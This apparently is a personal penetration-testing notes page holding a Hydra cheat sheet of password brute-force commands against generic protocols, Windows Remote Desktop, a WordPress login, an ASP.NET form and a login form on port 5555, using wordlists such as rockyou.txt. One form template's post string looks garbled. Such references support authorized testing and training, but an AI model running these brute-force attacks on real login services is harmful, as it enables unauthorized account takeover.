[[Wordlists#Passwords]]

https://github.com/frizb/Hydra-Cheatsheet

```
hydra -l <username> -P /usr/share/wordlists/<wordlist> <ip> http-post-form
```

| Command | Description |
| --- | --- |
| `hydra -P <wordlist> -v <ip> <protocol>` | Brute force against a protocol of your choice |
| `hydra -v -V -u -L <username list> -P <password list> -t 1 -u <ip> <protocol> ` | You can use Hydra to bruteforce usernames as well as passwords. It will loop through every combination in your lists. (-vV = verbose mode, showing login attempts) |
| `hydra -t 1 -V -f -l <username> -P <wordlist> rdp://<ip> ` | Attack a Windows Remote Desktop with a password list. |
| `hydra -l <username> -P .<password list> $ip -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location' ` | Craft a more specific request for Hydra to brute force. |

Using template form:
```
hydra -l <username> -P /usr/share/wordlists/<wordlist> <ip> http-post-form "/Account/log.aspx:_VIEWSTATE=KJLSAHaliudhAFDKSbhIU3iufb3fbc23p49&__EVENTVALIDATION=NJMBNASDKBADS989asd97ASD&9as7d97gasdgaS(dgasdgadsg9asdg%24username=admin%ctl00%24LoginUser%24Password=^PASS^%24LoginButton=Log+in:Login Failed"
```

Different port
```
hydra -s 5555 -l admin -P /usr/share/wordlists/rockyou.txt 127.0.0.1 http-post-form "/j_acegi_security_check:j_username=admin&j_password=^PASS^&from=%2F&Submit=Sign+in:loginError"
```
